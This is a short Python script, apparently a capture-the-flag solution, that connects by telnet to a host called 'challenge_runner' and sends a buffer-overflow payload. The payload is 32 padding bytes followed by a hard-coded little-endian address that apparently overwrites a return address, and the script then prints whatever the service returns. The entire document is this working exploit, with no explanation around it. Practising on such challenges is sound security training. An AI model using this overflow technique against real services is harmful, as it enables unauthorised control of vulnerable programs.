#!/bin/python

import telnetlib

payload = "a"*32 + "\xbb\x85\x04\x08"

tn = telnetlib.Telnet("challenge_runner")
tn.write(payload + "\n")
tn.read_until("Hello, " + payload)
print(tn.read_all().strip())
